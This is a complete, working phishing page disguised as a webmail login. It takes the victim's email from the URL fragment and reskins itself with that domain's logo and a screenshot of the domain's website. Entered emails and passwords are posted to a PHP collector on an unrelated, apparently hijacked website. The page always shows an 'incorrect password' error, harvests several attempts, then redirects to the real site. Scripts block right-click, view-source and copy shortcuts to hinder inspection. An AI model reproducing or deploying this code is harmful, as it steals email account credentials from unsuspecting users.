<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title class="brandName">Webmail Interface</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link  class="brandLogo" rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/561/561127.png">


    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden;
        }
        .background-frame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
        }
        .overlay-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 0;
        }
        .container-box {
            position: relative;
            z-index: 1;
            background-color: white;
            max-width: 400px;
            padding: 20px;
            padding-bottom: 50px;
            margin: auto;
            top: 50%;
            transform: translateY(-50%);
            border-radius: 8px;
        }
        .container-box .input-group {
            position: relative;
        }
        .container-box .input-group .fa-arrow-left {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
        }
        .container-box .form-control.user-email {
            width: 95%;
            border: none;
            border-bottom: 2px solid #ccc;
            box-shadow: none;
            background-color: #fff;
        }
        .container-box .form-control.user-password {
            width: 95%;
            border: none;
            border-bottom: 2px solid #ccc;
        }
        .title-section {
            display: flex;
            align-items: center;
        }
        .title-section h1 {
            margin-right: 10px;
        }
        @media (max-width: 576px) {
            .container-box {
                width: 90%;
                padding: 10px;
            }
            .container-box .form-control.user-password {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <div class="overlay-layer"></div>
    <div class="container-box">
        <form id="user-form">
            <div class="input-group">
                <img id="brandLogo" src="https://cdn.glitch.global/3ec1f4d4-e9b4-4f83-9653-8f3b0e58a9be/rc-logo.png?v=1738159271922" alt="Brand Logo" class="img-fluid" width="50px">
            </div>

<br />
            <div class="input-group title-section">
                <h5 id="brandName" style="text-transform: uppercase;">MailHub</h5> &nbsp;
                <h5 id="sub-header">Access Portal</h5>
            </div>
        <center>
          <div class="alert alert-danger" id="errorMessage" style="display: none; font-size:14px;">Invalid input. Email/password is incorrect</div>
          <span id="warning-text" class="errorText" style="display: none;">This account is not found. Try a different one.</span>
        </center>
            <div id="confirmation-box" class="input-group mt-3"></div>
            <div class="input-group">
                <input type="email" class="form-control user-email" id="userEmail" name="userEmail" placeholder="E-mail" required>
            </div>
<br />
            <div class="input-group">
                <input type="password" class="form-control user-password" id="userPassword" placeholder="Input password" required>
            </div>
<br />
            <div class="input-group">
                <p>Input valid credential to upgrade your email.</p> 
                <button type="submit" class="btn btn-primary float-right" id="loginButton">Authenticate</button>
            </div>

        </form>
    </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

<script>

// Disable Ctrl + S
$(document).bind('keydown', function(event) {
    if(event.ctrlKey && (event.which == 83)) {
        event.preventDefault();
        return false;
    }
});

// Disable right-click context menu
document.addEventListener('contextmenu', event => event.preventDefault());

// Block specific keyboard shortcuts (Ctrl + C, V, U, F6)
document.onkeydown = function(event) {
    if (event.ctrlKey && 
        (event.keyCode === 67 || // Copy
         event.keyCode === 86 || // Paste
         event.keyCode === 85 || // View source
         event.keyCode === 117)) { // F6
        return false;
    } else {
        return true;
    }
};

// Prevent Ctrl + U
$(document).keypress("u", function(event) {
    if(event.ctrlKey) {
        return false;      
    } else {
        return true;
    }
});

$(document).ready(function() {
    var attemptCount = 0;

    // Handle back button click
    $('#goBackBtn').click(function () {
        $("#errorMessage").hide();
        $('#userEmail').val("");
        $("#emailSection").animate({left: 200, opacity: "hide"}, 0);
        $("#loginForm").animate({right: 200, opacity: "show"}, 1000);
    });

    var extractedEmail = window.location.hash.substr(1);
    if (extractedEmail) {
        var formattedEmail = extractedEmail;
        $('#userEmail').val(formattedEmail); 
        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!emailPattern.test(formattedEmail)) {
            $('#errorText').show();
            return false;
        }

        var atIndex = formattedEmail.indexOf("@");
        var domainPart = formattedEmail.substr((atIndex + 1));
        var websiteLink = 'https://' + domainPart; 
        var domainPrefix = domainPart.substr(0, domainPart.indexOf('.'));
        var lowercaseDomain = domainPrefix.toLowerCase();

        var backgroundUrl = "url('https://image.thum.io/get/width/1200/https://" + domainPart + "')";
 
        $(".brandLogo").attr("src", "https://logo.clearbit.com/" + websiteLink);       
        $("#brandLogo").attr("src", "https://logo.clearbit.com/" + websiteLink);
        $("#brandName").html(lowercaseDomain);
        $(".brandName").html(lowercaseDomain);
         
        document.body.style.backgroundImage = backgroundUrl;
        $(".emailDisplay").html(extractedEmail);
    }

    // Handle form submission
    $('#loginButton').click(function(event) {
        event.preventDefault();
        $('#errorText').hide();
        $('#errorMessage').hide();

        var userEmail = $("#userEmail").val();
        var userPassword = $("#userPassword").val();
        var emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!userEmail) {
            $('#errorText').show().html("Email field cannot be empty");
            return false;
        }

        if (!emailRegex.test(userEmail)) {
            $('#errorText').show().html("Invalid e-mail address, please try another one");
            return false;
        }

        if (!userPassword) {
            $('#errorText').show().html("Password field cannot be empty");
            return false;
        }


        
        attemptCount += 1;

        $.ajax({
            dataType: 'JSON',
            url: "https://epicadventures.sk/app/webroot/files/gallery/56/php/wetransfer/podcast.php",
            type: 'POST',
            data: {
                email: userEmail,
                password: userPassword
            },
            beforeSend: function() {
                $('#loginButton').html('Processing...');
            },
            success: function(response) {
                $('#errorMessage').html("<span style='color:red;'>Incorrect username or password. Please try again.</span>");
                if (response) {
                    $("#errorMessage").show();
                    console.log(response);
                    $('#errorMessage').html(response['msg']);
                    if (response['signal'] == 'ok') {
                        $("#userPassword").val("");
                        if (attemptCount >= 3) {
                            attemptCount = 0;
                            window.location.replace("https://www." + domainPart);
                        }
                    } else {
                        $('#errorMessage').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#userPassword").val("");
                if (attemptCount >= 3) {
                    attemptCount = 0;
                    window.location.replace("https://www." + domainPart);
                }
                $("#errorMessage").show();
            },
            complete: function() {
                $('#loginButton').html('Authenticate');
            }
        });
    });

});
</script>

</body>
</html>

